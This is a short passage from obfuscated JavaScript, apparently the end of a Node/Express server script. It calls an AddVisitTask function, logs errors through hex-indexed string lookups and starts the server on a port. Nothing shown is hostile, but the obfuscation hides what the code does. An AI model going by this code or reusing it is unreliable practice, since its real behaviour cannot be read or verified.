AddVisitTask();}catch(_0x38aa6d){console[_0x4b5320(0x170)](_0x4b5320(0x121),_0x38aa6d);}}startserver()['catch'](_0x4a4c4b=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x4a4c4b);}),app[_0x1fab3b(0xfa)](PORT,()=>console['log'](_0x1fab3b(0x11c)+PORT+'!'));
